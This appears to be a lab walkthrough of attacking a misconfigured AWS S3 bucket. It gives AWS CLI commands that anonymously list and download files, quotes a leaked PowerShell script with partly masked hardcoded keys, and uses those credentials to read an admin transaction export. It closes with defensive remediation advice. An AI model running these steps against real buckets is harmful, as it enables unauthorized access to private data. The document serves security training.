Real-world context

Amazon S3 (Simple Storage Service) is a popular AWS service used to store files, backups and can even be used to serve websites. Misconfigurations and overly permissive S3 settings have caused many breaches — e.g. making buckets world-readable or storing sensitive files alongside public website content.

Walkthrough

Initial reconnaissance

Start by viewing the site and its source. You'll often find an S3 bucket used for static files (images, CSS, JS) — in this lab it's dev.huge-logistics.com.

Browser attempts

Examples (not successful here):

https://s3.amazonaws.com/dev.huge-logistics.com/static/style.css
https://s3.amazonaws.com/dev.huge-logistics.com/static/
https://s3.amazonaws.com/dev.huge-logistics.com/

Both of the directory requests above returned access denied in the browser.

Use the AWS CLI

Install on Debian/Ubuntu:

apt install awscli

Try listing the bucket anonymously (unsigned):

aws s3 ls s3://dev.huge-logistics.com --no-sign-request

Note: the AWS CLI v2 signs requests by default; --no-sign-request forces an unsigned (anonymous) request.

What the CLI revealed

The bucket was open to public listing via the CLI, showing directories including shared/, static/, admin/ and migration-files/. Recursive listing failed (access denied).

aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive
aws s3 ls s3://dev.huge-logistics.com/admin --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/migration-files/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/static/ --no-sign-request
aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request

The shared/ directory contained hl_migration_project.zip. Download it:

aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
unzip hl_migration_project.zip

Inside was a PowerShell migration script containing hardcoded AWS keys and the region us-east-1 (useful to know when configuring AWS credentials).

PowerShell snippet (from the leaked script)

# AWS Configuration
$accessKey = "A**************U"
$secretKey = "MwG******************RX/gb9"
$region = "us-east-1"

# Set up AWS hardcoded credentials
Set-AWSCredentials -AccessKey $accessKey -SecretKey $secretKey

# Set the AWS region
Set-DefaultAWSRegion -Region $region

# Read the secrets from export.xml
[xml]$xmlContent = Get-Content -Path "export.xml"

# Output log file
$logFile = "upload_log.txt"

# Error handling with retry logic
function TryUploadSecret($secretName, $secretValue) {
    $retries = 3
    while ($retries -gt 0) {
        try {
            $result = New-SECSecret -Name $secretName -SecretString $secretValue
            $logEntry = "Successfully uploaded secret: $secretName with ARN: $($result.ARN)"
            Write-Output $logEntry
            Add-Content -Path $logFile -Value $logEntry
            return $true
        } catch {
            $retries--
            Write-Error "Failed attempt to upload secret: $secretName. Retries left: $retries. Error: $_"
        }
    }
    return $false
}

foreach ($secretNode in $xmlContent.Secrets.Secret) {
    Start-Job -ScriptBlock {
        param($secretName, $secretValue)
        TryUploadSecret -secretName $secretName -secretValue $secretValue
    } -ArgumentList $secretNode.Name, $secretNode.Value
}

# Wait for all jobs to finish
$jobs = Get-Job
$jobs | Wait-Job

# Retrieve and display job results
$jobs | ForEach-Object {
    $result = Receive-Job -Job $_
    if (-not $result) {
        Write-Error "Failed to upload secret: $($_.Name) after multiple retries."
    }
    Remove-Job -Job $_
}

Write-Output "Batch upload complete!"

When using the leaked it-admin credentials, the admin folder becomes listable. You might find:

aws s3 ls s3://dev.huge-logistics.com/admin/
aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv -

Why did CLI anonymous list work while the browser failed?

The bucket policy allowed s3:ListBucket only when requests included specific parameters (prefix and delimiter). The AWS CLI includes these parameters by default; browsers usually do not. Example policy statement:

{
  "Sid": "ListBucketRootAndShared",
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:ListBucket",
  "Resource": "arn:aws:s3:::dev.huge-logistics.com",
  "Condition": {
    "StringEquals": {
      "s3:prefix": [
        "",
        "shared/",
        "static/"
      ],
      "s3:delimiter": "/"
    }
  }
}

To list the root in a browser (include parameters):

https://dev.huge-logistics.com.s3.amazonaws.com/?prefix=&delimiter=/

Defense & remediation

  • Do not mix public website content and sensitive files in a single S3 bucket — separate buckets for public vs sensitive data.
  • Never hardcode AWS credentials in scripts. Use IAM roles, environment variables, or a secure secrets manager and enforce rotation.
  • Limit bucket policies and enforce least privilege; use encryption and restrict public read/list where not needed.
  • When sharing files with external parties, prefer secured, time-limited mechanisms (pre-signed URLs, encrypted archives, or secure transfer tools).
